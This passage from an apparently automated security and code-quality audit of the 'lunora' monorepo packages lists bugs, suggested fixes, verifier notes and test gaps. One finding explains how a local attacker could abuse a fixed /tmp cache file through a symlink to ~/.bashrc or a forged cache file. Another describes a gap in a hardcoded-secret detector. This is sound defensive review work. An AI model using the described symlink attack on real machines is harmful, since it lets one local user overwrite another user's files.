cacheFilePath (line 73) is the fixed name `lunora-cli-update.json` directly under os.tmpdir(), and writeCache (lines 95–101) writeFileSync's it, following symlinks. On Linux, /tmp is shared: a local attacker can pre-create /tmp/lunora-cli-update.json as a symlink to a victim-writable file (e.g. ~/.bashrc); the next interactive `lunora <cmd>` overwrites the target with the JSON cache. The attacker can also plant a real file with `{checkedAt: 9e15, latest: "0.0.1"}` to permanently suppress (or fake) update notices. The codebase explicitly defends against exactly this pattern elsewhere — seed/handler.ts:126–129 cites CWE-377 and uses mkdtemp for its scratch file — so this file is below the repo's own bar.

**Suggested fix:** Store the cache in a per-user directory (e.g. `join(tmpdir(), "lunora-" + os.userInfo().username)` created 0700, or better an XDG cache dir), or open with O_NOFOLLOW/`fs.writeFileSync(fd)` after lstat-checking the path.

#### Missing test coverage

- spawnShellCompat win32 quoting with cmd.exe metacharacters — spawn.test.ts only asserts whitespace quoting (line 38); no case for args containing &, ^, |, embedded double-quotes, or a trailing backslash before the closing quote.
- `env set`/`env generate --set` round-trip on a .dev.vars that contains comments and blank lines — env.test.ts has no 'comment' assertions, so the comment-destroying rewrite (serializeDevVariables) is unobserved.
- studio-server WebSocket upgrade path: **tests**/util/studio-server.test.ts contains zero 'upgrade' tests — neither proxyUpgrade's handshake replay/host rewrite nor the non-loopback-Host socket.destroy() guard on server.on("upgrade") is exercised.
- runMigrateToHyperdriveCommand failure paths: no test that the mkdtemp dump directory is removed when runImportCommand throws (non-2xx batch) or when the export fails (migrate.test.ts only covers the same-URL refusal and happy path around line 599).
- data-transfer streamNdjsonToSink with multi-byte UTF-8 split across chunk boundaries (TextDecoder stream:true) and with a sink returning write()===false (the writeWithBackpressure drain branch) — data-transfer.test.ts feeds only ASCII single-chunk bodies.
- util/wrangler-secrets (parseSecretNames / listRemoteSecrets) has no direct unit tests — no test file in **tests** references either export, so malformed `wrangler secret list` JSON handling (non-array, entries without name, non-zero exit) is untested.
- isLoopbackHost edge inputs in studio-server (bracketed IPv6 with port `[::1]:6173`, missing Host header, `0.0.0.0` Host) — the exported guard's port-stripping slice logic has no dedicated test.
- deploy --migrate preflight interplay: no test that a linked project (.lunora/project.json) satisfies the --migrate-url requirement via resolveWorkerUrl fallback while still enforcing --migrate-yes (deploy/handler.ts:1097 + 638-677).

<a id="lunoraclient"></a>

### @lunora/client

**Assessment:** A mature, defensively engineered package: the wire codec guards prototype pollution and bigint DoS, offline writes are identity-gated end-to-end, socket lifecycle uses identity-checked handlers, and ~390 tests cover most core paths — no injection, unsafe-deserialization, or secret-leak vulnerabilities were found. The real risks are lifecycle/edge gaps rather than systemic flaws: in-flight streams hang forever on a WS disconnect, the shared identity store never resolves cookie-session users (and is forked verbatim into @lunora/react), and the offline-queue subject restamp doesn't survive a reload or a transient requeue.

#### 1. [HIGH / bug] In-flight streams hang forever after a WebSocket disconnect — **verified: confirmed**

`packages/client/src/lunora-client.ts:3681`

handleDisconnect (line 3681) tears down the socket, heartbeat, and timers but never touches `this.streams`. A stream whose start frame was already sent (so NOT in `conn.pendingStreams`) loses its server-side iterator when the socket drops, and nothing on the client fails or completes its StreamHandle - the consumer's `for await` blocks on a pending next() promise forever. The reconnect open-handler comment (line 3612) even acknowledges in-flight streams have torn down server-side, yet only flushes never-sent frames. Streams ARE failed on close() (line 2748), on an error frame, and on pending-queue overflow - but not on the most common termination, a socket bounce. Stale entries also leak in `this.streams`. Failure scenario: flaky Wi-Fi during `client.stream(...)` iteration - socket drops mid-stream, the awaiting code hangs indefinitely with no rejection, and the reconnected socket never resumes the stream.

**Suggested fix:** In handleDisconnect, fail and delete every `this.streams` entry bound to this connection's shard key (excluding ids still queued in conn.pendingStreams, which legitimately ride the next reconnect).

**Verifier note:** Verified in /home/user/lunora/packages/client/src/lunora-client.ts: handleDisconnect (lines 3681-3720) tears down heartbeat/timers/socket and arms reconnect but never iterates this.streams. The only fail() sites are pending-queue overflow (2727), client.close() (2749), and a server error frame (3921); complete() only on a server complete frame (4264). A stream whose start frame was already sent is not in conn.pendingStreams, so the reconnect open-handler (3611-3623, whose comment admits in-flight streams tore down server-side) neither re-sends nor fails it, and the new server session has no knowledge of the old stream id. stream.ts's iterator parks pending next() promises with no timeout/watchdog, so the consumer's for-await hangs forever after a socket bounce, and the stale Map entry leaks until client.close(). Reachable via the public client.stream() API on any WS close/error; no test pins disconnect behavior for streams (stream.test.ts only covers cancel, backpressure, and client.close()). Adjacent code comments explicitly treat forever-hanging consumers as a bug guarded against elsewhere, confirming this path was missed. High severity stands: indefinite unrejectable hang on the most common termination (transient network loss) in a real-time SDK.

#### 2. [HIGH / bug] Identity store never resolves cookie-session users (short-circuits on null bearer token) — **verified: REFUTED (not a real issue)**

`packages/client/src/auth/index.ts:58`

createIdentityStore.refresh() returns early with setUser(null) whenever client.getAuthToken() === null (lines 58-63). But LunoraClient.getCurrentUser() (lunora-client.ts:993) deliberately sends credentials: 'include' so cookie-based better-auth sessions work without any bearer token - the default better-auth web flow. An app using cookie sessions never calls setAuthToken, so the token is always null, refresh() never issues the fetch, and every adapter built on this store (vue, solid, svelte, angular all call getIdentityStore) permanently reports the user as signed out even though getCurrentUser() would resolve them. Failure scenario: a Vue app with @lunora/auth cookie sessions - user signs in, session cookie set, useAuth() returns user: null forever.

**Suggested fix:** Only short-circuit when the token transitions to null after having been non-null (explicit sign-out), or always attempt getCurrentUser() and let a null/401 response mean signed-out. The identical bug exists in the duplicated copy in packages/react/src/use-auth.ts.

**Verifier note:** The short-circuit mechanically exists (auth/index.ts:58 and the identical react/use-auth.ts:58): a null token skips getCurrentUser(), so a cookie-only session never resolves through the identity store. However, this is deliberate, documented, and test-pinned design — not a bug. (1) A React test explicitly pins it: "user is null when no token is set" asserts getCurrentUser is NOT called ("No token ⇒ getCurrentUser is short-circuited, user stays anon"). (2) The documented client contract across the docs site (concepts/authentication.mdx) and every adapter docstring (React/Vue/Solid) is token-based: "identity is a token carried on the shared LunoraClient... you hand the resulting token to the client" and user is "refetched whenever the token changes" via setToken(jwt). No adapter promises cookie-only resolution. (3) The official cookie-session flow (registry/auth blueprint, "Cookie-session authentication for Lunora") directs users to better-auth's own client (createAuthClient → authClient.useSession()) for client-side session state, not Lunora's useAuth — so cookie-session apps have a sanctioned, working client path that bypasses this store entirely. (4) getCurrentUser's cookie support (credentials: "include") serves direct callers and the SSR helpers (get-server-session forwards cookies), not the hooks. The claimed failure scenario requires a developer to use useAuth outside its documented contract in a flow whose documented integration is a different hook. What remains is at most a doc/DX tension between getCurrentUser's docstring and the store's short-circuit — not a genuine high-severity defect.

#### 3. [MEDIUM / bug] Subject restamp is in-memory only - same-user offline writes rejected after a reload or transient-failure requeue

`packages/client/src/lunora-client.ts:4371`

restampQueuedIdentity (line 4371) migrates identity stamps only in the in-memory queuedIdentities map; it never updates item.identity (readonly, captured at enqueue) nor the record persisted by OfflineQueue.enqueue (offline-queue.ts:156-167). Consequences: (1) Reload - a write queued before the subject resolved is persisted with the token-hash fingerprint; after setAuthToken(token, userId) the current identity is subj:<id>; on the next reload, hydrate restores the old stamp, passesReplayIdentityGate (line 4508) falls back to item.identity, mismatches, and rejects the same user's durable write with OFFLINE_IDENTITY_CHANGED. (2) Same session - the gate consumes the live stamp (line 4525) even when the write passes; if the replay fails transiently and is requeued, the next flush falls back to the stale item.identity and wrongly rejects it. This contradicts setAuthToken's documented promise (lines 832-836) that establishing the subject re-stamps in-flight queued writes rather than dropping them. The test at lunora-client.test.ts:1504 covers only the in-memory same-session happy path.

**Suggested fix:** On restamp, also rewrite the persisted records (remove+append or an adapter update), or make the gate accept a token-hash stamp when the token it hashed is still the current credential.

#### 4. [MEDIUM / refactor] OptimisticLocalStore does an O(N) subscription scan with shardKey semantics that diverge from the registry

`packages/client/src/local-store.ts:65`

findState (lines 65-73) linearly scans subscriptions.all() comparing state.shardKey === shardKey, even though SubscriptionRegistry.key already indexes exactly this triple, and the sibling path applyOptimisticUpdates (lunora-client.ts:3168) was explicitly converted to the O(1) keyed lookup for that reason. Beyond the O(N) cost per setQuery/getQuery inside every optimisticUpdate callback, the strict === on shardKey is inconsistent with the registry's `shardKey ?? ""` normalization: a subscription registered with shardKey '' and a mutation issued with shardKey undefined (or vice versa) share a registry key but fail findState's comparison, so setQuery silently no-ops and the optimistic patch never lands - while the single-query optimistic path on the same mutation would match (breaking the equivalence documented at lunora-client.ts:3147-3150).

**Suggested fix:** Replace findState with subscriptions.get(SubscriptionRegistry.key(functionRef, args, shardKey)) and normalize shardKey via ?? '' in getAllQueries.

#### 5. [MEDIUM / reuse] @lunora/react carries a verbatim fork of the shared identity store instead of consuming @lunora/client/auth

`packages/react/src/use-auth.ts:30`

packages/client/src/auth/index.ts exists explicitly (per its docblock) as the shared store every UI adapter can consume, and vue/solid/svelte/angular all import getIdentityStore from @lunora/client/auth. React's use-auth.ts:30-80 (createStore) is a line-for-line copy of createIdentityStore - same WeakMap, same generation guard, same comments, and the same cookie-session bug reported above. Every identity-store fix must be made twice and will silently drift.

**Suggested fix:** Replace React's private createStore with getIdentityStore(client) from @lunora/client/auth, keeping only the useSyncExternalStore wiring local.

#### 6. [LOW / bug] Server complete plus a late unsubscribe can evict a newer subscription from the registry

`packages/client/src/lunora-client.ts:4270`

handleCompleteMessage (lines 4270-4274) removes a subscription state from the registry while its consumers' unsubscribe closures still reference it. If a new subscription for the same (fn, args, shardKey) is created afterwards (subscribe() finds no state and builds S2 under the same registry key), the original subscriber's later unsubscribe runs subscriptions.remove(S1) (line 2579), and SubscriptionRegistry.remove (subscription.ts:143) deletes byKey by recomputed key - deleting S2's byKey entry. S2 keeps receiving frames via byId but becomes invisible to subscribe()'s dedup and the optimistic-update keyed lookup: a third subscribe() leaks a duplicate server registration and optimistic updates stop matching S2. Requires a server-side subscription cancel (complete) followed by resubscribe + unmount - rare but silently corrupting.

**Suggested fix:** Make SubscriptionRegistry.remove identity-checked: only delete the byKey entry when it still maps to the state being removed.

#### 7. [LOW / bug] Delta-merge insert assumes ascending _creationTime; descending-ordered results get mis-positioned rows

`packages/client/src/delta-merge.ts:61`

insertionIndex (lines 61-77) places a new row before the first existing row with a LARGER _creationTime - assuming the cached list is sorted ascending. For a query ordered descending (newest-first feeds, the common chat/feed shape), a freshly inserted newest row matches no existing > creation check and is appended to the END of the list, so the UI shows the new item at the bottom until the next full snapshot reconciles. There is no ordering validation and no fallback-to-replace for non-ascending lists, so the mis-order is displayed rather than avoided.

**Suggested fix:** Detect the list's direction from the existing rows' _creationTime sequence (or carry the query's order in subscription metadata) and either insert accordingly or return undefined to force the full-replacement fallback.

#### 8. [LOW / refactor] IndexedDB plumbing duplicated between persistence.ts and query-cache.ts

`packages/client/src/query-cache.ts:102`

promisifyRequest, the lazy openDatabase promise cache, the upgradeneeded wiring, and the withStore transaction wrapper are duplicated nearly line-for-line between query-cache.ts:102-183 and persistence.ts:65-142 (same package; non-trivial complete/error/abort handling). The two adapters already diverged once on schema versioning (the VersionError incident documented at query-cache.ts:89-99); two copies of the transaction plumbing invite the next drift.

**Suggested fix:** Extract a small internal idb-util module (promisifyRequest, openDatabase(name, version, upgrade), withStore) consumed by both adapters; the databases stay separate, only the plumbing is shared.

#### Missing test coverage

- Mid-flight stream behaviour on WS disconnect: no test asserts a stream consumer awaiting next() gets a terminal signal when the shard socket drops after the start frame was sent (stream tests only cover close(), backpressure, cancel, and error frames).
- src/auth/index.ts (getIdentityStore) has zero tests: the generation guard against out-of-order getCurrentUser resolutions, the token-change refetch, the cookie-session (null-token) path, and the single-fetch fan-out invariant.
- src/mutation-runner.ts (createMutationRunner) is untested: ref-counted setPending across overlapping invocations resolving out of order, and non-Error rejection normalization (mutator-runner has tests; mutation-runner has none).
- Identity restamp durability: lunora-client.test.ts:1504 covers only the same-session in-memory restamp; nothing covers a restamped write surviving a reload (hydrate restores the old token-hash stamp) or a transient replay failure + requeue after passesReplayIdentityGate consumed the live stamp.
- subscribeScheduledJobs is untested: reconnect backoff loop, picking up a rotated wsToken on reconnect, non-JSON frame tolerance, and unsubscribe cancelling the pending reconnect timer.
- Server complete frame targeting a subscription (handleCompleteMessage's registry-removal branch) and the subsequent resubscribe/late-unsubscribe interaction have no test.
- applyDelta against a descending-ordered cached list: delta-merge tests only exercise ascending _creationTime ordering.
- acquireConnectionContext refcounting is thinly covered: multi-holder last-writer-wins stack, release-order permutations, and fallback to the imperative setConnectionContext override on last release.

<a id="lunoracloudflare-access"></a>

### @lunora/cloudflare-access

**Assessment:** This is a clean, carefully-written package: the JWT verification pins RS256, enforces issuer and a mandatory audience, fails closed to anonymous everywhere, avoids ReDoS-prone regexes, and the 692-line test suite covers signature/issuer/audience/expiry/alg-confusion, fail-closed paths, and the middleware surfaces well. The findings are edge-hardening items — silent per-request swallowing of configuration errors, an empty-string userId escape hatch, and a small deliberate duplication — rather than exploitable defects.

#### 1. [MEDIUM / refactor] Configuration errors (missing aud / empty teamDomain) are thrown per-request and swallowed by verifyRequest, so a misconfigured deployment runs silently anonymous

`packages/cloudflare-access/src/verify.ts:98`

verifyAccessJwt throws a LunoraError when `options.aud` is missing/empty (verify.ts:98-103) or `teamDomain` is empty (verify.ts:36), but both checks run inside verifyRequest's catch-all (verify.ts:139-153), which maps ANY throw to `undefined` (anonymous). Both values are static construction-time options of createAccessResolver / accessAdminGate, yet they are only validated per request. Failure scenario: `env.CF_ACCESS_AUD` is unset in production — every request resolves to anonymous and accessAdminGate denies everyone, with zero signal unless the user wired `onError` (and even then the config error is indistinguishable from a bad token, fired on every request). The fail-closed catch is deliberate for token errors, but config validation should happen eagerly in the createAccessResolver/accessAdminGate factories so a broken deployment fails fast at startup instead of degrading silently.

**Suggested fix:** In createAccessResolver and accessAdminGate (and optionally a shared helper), validate teamDomain via accessIssuer() and normalize/require the non-empty audience list at factory time, throwing there; keep the per-request catch only for genuine token verification failures.

#### 2. [LOW / bug] deriveUserId / toIdentity can mint an identity with userId === "", violating the stated no-id-means-anonymous invariant

`packages/cloudflare-access/src/resolver.ts:22`

deriveUserId guards `sub` for non-emptiness (`claims.sub.length > 0`, resolver.ts:20) but the fallbacks are bare nullish-coalescing: `sub ?? claims.email ?? claims.common_name` (resolver.ts:22). An empty-string `email` or `common_name` claim is not nullish, so it becomes the userId. Likewise toIdentity accepts a mapClaims override with only `typeof overrides.userId === "string"` (resolver.ts:32) — a buggy `mapClaims` returning `userId: ""` passes. In both cases the `userId === undefined` anonymous check (resolver.ts:34) is bypassed and the runtime receives `ctx.auth.userId === ""`: RLS ownership policies and `serverDefault(({auth}) => auth.userId)` stamp rows with the empty string, and every such caller shares one colliding identity instead of being treated as anonymous. The doc comment on deriveUserId explicitly states the intent is to treat a missing id as anonymous 'rather than minting an identity with no id' — the empty-string path contradicts it.

**Suggested fix:** Introduce a `nonEmpty = (v: unknown) => typeof v === "string" && v.length > 0 ? v : undefined` helper and apply it to sub, email, common_name, and overrides.userId alike.

#### 3. [LOW / reuse] Groups-extraction logic duplicated between roles.ts defaultReadGroups and context.ts facadeFor, kept in sync only by comments

`packages/cloudflare-access/src/roles.ts:44`

defaultReadGroups (roles.ts:44-50) and facadeFor (context.ts:81 plus stringList at context.ts:48) both implement 'promoted top-level `groups` ?? nested `access.groups`, keep string entries only'. Each carries a comment warning that it mirrors the other ('This mirrors the `ctx.access` facade in `context.ts`'), i.e. drift is a known risk with no mechanical guard — a future change to the fallback order or filtering in one file silently diverges role grants (RLS input) from what `ctx.access.groups`/`hasGroup` report for the same request.

**Suggested fix:** Extract a small internal module (e.g. src/identity-groups.ts) exporting one `readIdentityGroups(identity)` used by both context.ts and roles.ts; both subpath bundles inline it, so the package export shape is unchanged.

#### Missing test coverage

- Custom headerName/cookieName options (RequestVerifyOptions) are never exercised — every test uses the defaults, so the headerName lowercasing path in verify.ts:131 and non-default cookie lookup in read-token.ts are untested.
- The production remote-JWKS path is completely untested: remoteJwks()/jwksByIssuer caching and the `https://<team>.cloudflareaccess.com/cdn-cgi/access/certs` URL construction (verify.ts:57-68) — all tests inject keySet, so a typo in CERTS_PATH or a cache-keying regression would pass the suite.
- readToken edge cases have no direct tests: a present-but-empty header value falling back to the cookie, a cookie value containing '=', an empty cookie value returning undefined, and multiple cookies where the target is not first (read-token.ts:12-40).
- composeResolvers forwarding the `env` argument to each inner resolver (resolver.ts:91) is untested — the compose tests call resolve(request) with no env.
- facadeFor's envelope-override precedence — a mapClaims-promoted top-level email/commonName/groups winning over the nested access claims (context.ts:81, 86-87) — is untested; every context test sets the promoted fields equal to the nested claims, so swapping the ?? operands would not fail any test.
- deriveUserId with an empty-string email/common_name claim (and a mapClaims returning userId: "") — the empty-userId escape in resolver.ts:22/32 has no test pinning the intended anonymous behavior.

<a id="lunoracodegen"></a>

### @lunora/codegen

**Assessment:** This is an unusually defensive codegen package: every identifier spliced into generated TS is gated by an allowlist or JSON.stringify, collisions are asserted for namespaces/migrations/crons, the AOT validator compiler is sound-by-construction (defers to the interpreted parser on any doubt) and is differential-tested against the runtime oracle, and 77 test files cover nearly every discover/emit path. The findings are edge-case precision and validation gaps — a hard-crash on legitimate escaped/backtick v.literal() strings, missing uniqueness checks for deployed queue/workflow names, stale API-spec artifacts, and a 48-positional-parameter lint entry point that is a maintenance hazard — none indicate systemic weakness.

#### 1. [MEDIUM / bug] Legitimate v.literal() strings with escapes or backticks crash the whole codegen run with an INTERNAL error

`packages/codegen/src/emit.ts:143`

parseBuilderMember captures v.literal()'s raw source text (parse-validator.ts:153), and literalToType validates it against LITERAL_VALUE_RE (literal-value.ts:13), which rejects any string containing a backslash or any backtick template literal, then THROWS LunoraError("INTERNAL"). So a perfectly valid schema field like v.literal("it\"s") or v.literal(`admin`) (a no-substitution template literal — plausible under auto-formatting) aborts the entire codegen run with an error labeled as an internal codegen bug. The runtime path has the same hazard: resolve-package-extension.ts:84 renders package-extension literal strings via JSON.stringify, so any published extension whose literal contains a quote produces a backslash-bearing literalValue that hits the same throw. The compiled-validator side (compile-validator.ts:92) correctly just declines; only the type emitter fails hard.

**Suggested fix:** In parseBuilderMember, read the literal via getLiteralValue() for string/template literals and store a structured value; have literalToType re-emit with JSON.stringify instead of splicing raw source text, keeping the throw only for genuinely non-literal expressions.

#### 2. [MEDIUM / refactor] lintSchema takes 48 positional parameters, ~44 of them optional ReadonlyArray<...IR> — a silent-transposition hazard

`packages/codegen/src/advisor.ts:150`

The single call site (run-codegen.ts:358-407) passes ~46 discover results positionally. Several IR types are structurally similar ({file, exportName, line}-shaped evidence records), so swapping two adjacent arguments during the next feeder addition could typecheck yet feed the wrong evidence to the wrong lint, silently corrupting security advisories (the package's own history shows a new feeder is added every few releases). lintSchema's body immediately re-maps everything into the NAMED-field object runAdvisor already accepts, so the positional layer adds only risk.

**Suggested fix:** Change lintSchema to accept a single named-field options object (mirroring runAdvisor's input) and pass discover results by key at the run-codegen call site.

#### 3. [LOW / bug] No uniqueness check on deployed queue/workflow names — duplicate names produce cryptic or silent downstream failures

`packages/codegen/src/discover-queues.ts:183`

discoverQueues (and discoverWorkflows, discover-workflows.ts:200) never asserts that the deployed name (explicit `name:` override, or the camelCase-collapsed default — note queueDefaultName maps both `myQueue` and `myQUEUE` to "my-queue" and queueBindingName maps both to QUEUE_MY_QUEUE) is unique across exports. Two push queues sharing a name emit duplicate keys in the LUNORA_QUEUE_REGISTRY object literal (emit.ts:2554) — surfacing only as a cryptic TS1117 in a generated file; a push+pull pair sharing a name emits no error at all and yields conflicting wrangler producers/consumers entries. This contrasts with the module's own conventions: migrations assert unique ids (discover-migrations.ts assertUniqueIds), crons assert unique names, functions assert namespace uniqueness — all with located diagnostics.

**Suggested fix:** Add an assertUniqueNames-style pass over QueueIR/WorkflowIR checking `name` and `bindingName` collisions with a diagnosticAt error, matching the cron/migration guards.

#### 4. [LOW / bug] Switching apiSpec leaves a stale _generated/openapi.json (and .ts) describing the old API

`packages/codegen/src/run-codegen.ts:669`

writeIfPresent deliberately deletes stale conditional artifacts (containers/workflows/queues/seed/collections) when their feature is removed, but the spec files are only conditionally WRITTEN, never cleaned: changing apiSpec from the default "openapi" to "openrpc" or "none" leaves the last-written openapi.json/openapi.ts in _generated/ forever. Because openapi.json is explicitly the "portable artifact for external tooling", the stale file keeps documenting endpoints/args that no longer exist, silently drifting further from the real API on every subsequent schema change. The apiSpec tests (run-codegen.test.ts:1033-1065) only assert absence on a fresh directory, so the regression is unobserved.

**Suggested fix:** Route the four spec files through writeIfPresent (empty string when not wanted) so a spec mode switch removes the stale artifacts.

#### 5. [LOW / bug] ANY_TOKEN_RE false-positives on the literal type "any" or a property named `any`, degrading valid return types to unknown

`packages/codegen/src/discover-functions.ts:471`

unwrapHandlerReturn treats /\bany\b/ anywhere in the rendered return type as "type-checker in degraded mode" and erases the whole type to `unknown`. But \b matches at a quote boundary, so a handler returning { kind: "any" } (a common discriminant literal — the codebase's own ValidatorIR uses kind: "any"), a union member "any" | "all", or a property named `any` triggers the fallback: the generated FunctionReference and Caller leaf lose their real type even though the checker resolved it perfectly, silently breaking client-side inference for that function.

**Suggested fix:** Detect degraded mode structurally (walk the ts-morph Type tree for flags & TypeFlags.Any) instead of regexing the rendered text, or at minimum strip string-literal spans before testing.

#### 6. [LOW / bug] listLunoraSourceFiles skips any file named schema.ts at every depth, silently dropping registrations in nested schema.ts files

`packages/codegen/src/discover-functions.ts:786`

The walker's filter `entry !== "schema.ts"` is meant to exclude the top-level lunora/schema.ts (loaded separately by discoverSchema), but it applies at every directory level. A feature-folder file like lunora/admin/schema.ts that exports query()/mutation() registrations (or defineMigration) is silently excluded from discovery: no api.* entry, no dispatch-table entry, no warning — a runtime FUNCTION_NOT_FOUND with no codegen-time signal. refreshCodegenProject reuses the same walker, so the dev-loop inherits the blind spot.

**Suggested fix:** Only skip schema.ts when directory === lunoraDirectory (depth 0), e.g. thread the root through the recursion or compare `full === join(lunoraRoot, "schema.ts")`.

#### 7. [LOW / refactor] Dead, misleading `export const VERSION = "0.0.0"`

`packages/codegen/src/index.ts:101`

The package's real version is 1.0.0-alpha.38 and nothing in the repository reads this export; any external consumer that does gets a permanently wrong constant. It also shadows the pattern used correctly elsewhere (readProjectVersion reads package.json for the OpenAPI info.version).

**Suggested fix:** Delete the export, or populate it from package.json at build time if a runtime version constant is actually wanted.

#### 8. [LOW / security] hardcoded_secret advisor misses a complete secret literal concatenated with a dynamic operand

`packages/codegen/src/discover-secrets.ts:51`

For `"sk_live_abc..." + suffix`, literalValueOf on the root BinaryExpression returns undefined (one operand is dynamic), and each string-literal operand is then skipped by isConcatenationOperand (its parent is a `+` expression). So a fully-formed provider key sitting in one literal operand of a mixed concatenation is never tested against SECRET_RULES — a false negative in exactly the shape (`SECRET_PREFIX + env-derived tail`, or key + "/path") that appears in real code. The pre-commit `vis secrets` gate may still catch it, but the studio Advisors surface this feeder feeds will not.

**Suggested fix:** When the folded value of a `+` root is undefined, fall back to scanning each string-literal operand individually instead of skipping them.

#### Missing test coverage

- schemaFromIr (src/schema-from-ir.ts) — the seed-bridge that synthesizes runtime-shaped validators from static IR, including its quirky parseLiteral (JSON.parse fallback → quote-stripping → raw text) — has no test file referencing it at all despite being a public export consumed by the CLI and studio.
- argument-taint.ts has no direct unit tests: isScopedByContext's two-hop ctx-derived-local suppression and isRequestInputDerived's member-access-root hop (the deliberate fail-safe under-report boundaries) are only exercised indirectly through individual feeder tests.
- No test covers duplicate deployed queue/workflow names (explicit `name:` override collision, or camelCase-collapse collisions like myQueue/myQUEUE → identical binding + wrangler name) — the missing-uniqueness bug reported above.
- No test asserts stale-artifact behavior when `apiSpec` changes between runs (e.g. openapi.json left behind after switching to "openrpc"); the existing apiSpec tests only run against fresh directories.
- No test exercises v.literal() with a template literal or an escape-bearing string — the literalToType hard-crash path (emit.ts:143) and compileLiteral's decline path are both untested for these inputs.
- No test covers a nested `lunora/<sub>/schema.ts` file containing function registrations — the silent listLunoraSourceFiles exclusion reported above.
- No test covers a handler whose resolved return type legitimately contains the literal type "any" (e.g. { kind: "any" }) — the ANY_TOKEN_RE degrade-to-unknown branch (discover-functions.ts:471) is only tested for genuinely-degraded checker output.
- resolvePackageExtension's require()-based fallback is exercised only via discover-schema.test.ts happy paths; the failure modes documented as fail-safe (unresolvable specifier, module whose export walks to a non-object, renderLiteralValue on bigint/NaN literals) have no direct assertions.

<a id="lunoraconfig"></a>

### @lunora/config

**Assessment:** @lunora/config is in very good health: the highest-risk surfaces (the CSRF-defended studio JSON endpoints, the path-traversal-guarded asset server, the validator allow-list stopping code injection into schema.ts, the DNS-rebinding-aware admin-token flow, and the CAS-based .dev.vars writers) are carefully designed, extensively commented, and mostly well-tested. The findings are edge-hardening rather than structural: the one substantive bug is that the .dev.vars scaffolders mint random hex for provider-issued API keys (RESEND_API_KEY, STRIPE_SECRET_KEY, …) despite the module defining PROVIDER_SECRET_KEYS specifically to prevent that, which both breaks the provider integration and hides the unfilled key from `env doctor`.

#### 1. [MEDIUM / bug] Scaffolders mint random hex for provider-issued API keys, contradicting the module's own PROVIDER_SECRET_KEYS invariant — **verified: confirmed**

`packages/config/src/scaffold-dev-variables.ts:128`

generatedSecretFor() (line 128) generates a random 64-hex value for ANY key matching /(?:KEY|PASSWORD|SECRET|TOKEN)$/ whose value is a placeholder — it never consults PROVIDER_SECRET_KEYS / isMintableSecretKey (lines 138-150), whose own doc comment says "Generating a random value for one would be actively wrong (the provider would reject it)". All three planners use it: planDevVariablesScaffold (line 185), planDevVariablesAugment (line 234), and planDevSecretsFill (line 610). Failure scenario: a project using @lunora/mail — ensureDevVarsExample writes RESEND_API_KEY="<your-resend-api-key>" into .dev.vars.example; on the next `lunora dev` / vite dev start, ensureDevVariables (called from packages/cli/src/commands/dev/handler.ts:597 and packages/vite/src/dev-variables-plugin.ts:35) scaffolds .dev.vars with RESEND_API_KEY set to random hex. The provider rejects it at runtime, AND because the value no longer looks like a placeholder, `lunora env doctor` (which uses isPlaceholderValue) can no longer tell the user the key is unfilled — the misconfiguration is actively hidden. Same for STRIPE_SECRET_KEY, POLAR_ACCESS_TOKEN, CREEM_API_KEY, etc. Note the CLI deploy handler (packages/cli/src/commands/deploy/handler.ts:538) does honor isMintableSecretKey, so only this scaffolding path violates the invariant.

**Suggested fix:** Change generatedSecretFor to `isMintableSecretKey(key) && isPlaceholder(rawValue) ? randomHex(SECRET_BYTES) : undefined`, keeping provider-key placeholders verbatim so they stay detectable as unfilled. Add a regression test that RESEND_API_KEY / STRIPE_SECRET_KEY survive scaffolding as placeholders.

**Verifier note:** Confirmed against the code. (1) generatedSecretFor (packages/config/src/scaffold-dev-variables.ts:128-129) mints 64-hex for any key matching /(?:KEY|PASSWORD|SECRET|TOKEN)$/ with a placeholder value and never consults PROVIDER_SECRET_KEYS/isMintableSecretKey (lines 138-150), whose doc comment says minting such values is "actively wrong". (2) The scenario is reachable end-to-end: the registry (package-secrets-registry.ts) defines RESEND_API_KEY="<your-resend-api-key>", STRIPE_SECRET_KEY, POLAR_ACCESS_TOKEN, CREEM_API_KEY etc. — all match SECRET_KEY and isPlaceholderValue's angle-bracket branch. The CLI dev handler (packages/cli/src/commands/dev/handler.ts:587,597,624) first seeds .dev.vars.example with these placeholders (ensureDevVarsExample), then scaffolds .dev.vars via ensureDevVariables (prompted) AND fillDevSecrets (unprompted — despite its comment claiming it "only generates locally-derivable values", planDevSecretsFill at line 610 uses the same unguarded helper, so even a user who declines the prompt and hand-copies the example gets provider placeholders silently replaced with random hex). The Vite plugin (packages/vite/src/dev-variables-plugin.ts:35,37) hits both paths too. (3) The self-hiding effect is real: doctor (packages/cli/src/commands/doctor/handler.ts:166) flags unfilled secrets via isPlaceholderValue; random hex passes as "filled" and doctor's suggested fix is to re-run lunora dev — the operation that caused it. (4) The deploy handler (deploy/handler.ts:538,542) and env generate (env/handler.ts:416-417) DO honor isMintableSecretKey, confirming the scaffolding path is the outlier, not intended design. (5) No test pins provider-key preservation during scaffolding; existing tests only pin generation for generic non-registry keys and placeholder-only writes to the example file. Severity adjusted high→medium: it is a common-path (any @lunora/mail or @lunora/payment project on first dev run), self-hiding DX/correctness bug, but strictly local-dev, non-security, and recoverable — the provider surfaces its own auth error, even though Lunora's tooling then misleads the user about the cause.

#### 2. [MEDIUM / bug] Validator throws TypeError on null/malformed durable_objects.bindings and d1_databases entries instead of reporting an error

`packages/config/src/wrangler-validator.ts:1007`

The file's stated contract is that wrangler.jsonc is untrusted JSONC and every section guards null/malformed entries (containers, workflows, queues, tail_consumers all do). But line 1007 runs `durableObjectBindings.find((binding) => binding.name === "SHARD"...)`, line 1051 runs `d1Bindings.find((binding) => binding.binding === "DB")`, and validateContainers line 323 maps `binding.class_name` — none tolerate a null entry, and a non-array `durable_objects.bindings` value (e.g. a string) makes `.find` itself throw. Failure scenario: a wrangler.jsonc containing `"durable_objects": { "bindings": [null] }` (a stray trailing comma in JSONC parses exactly to this) makes validateWranglerConfig throw a raw `TypeError: Cannot read properties of null (reading 'name')`. The Vite plugin calls this in configResolved (packages/vite/src/wrangler-validator-plugin.ts:70) with no try/catch, so dev startup dies with an unexplained TypeError instead of the intended structured "must include SHARD binding" message; `lunora doctor` (packages/cli/src/commands/doctor/handler.ts:93) crashes the same way.

**Suggested fix:** Filter non-object entries first (mirror asBindingEntries / the containers guard): `const durableObjectBindings = Array.isArray(wrangler.durable_objects?.bindings) ? wrangler.durable_objects.bindings.filter((b) => b && typeof b === "object") : []`, same for d1_databases.

#### 3. [MEDIUM / bug] serveJsonHandler never forwards schemaDirectory, so studio endpoints always target the default "lunora" directory

`packages/config/src/studio-host/serve-json-handler.ts:187`

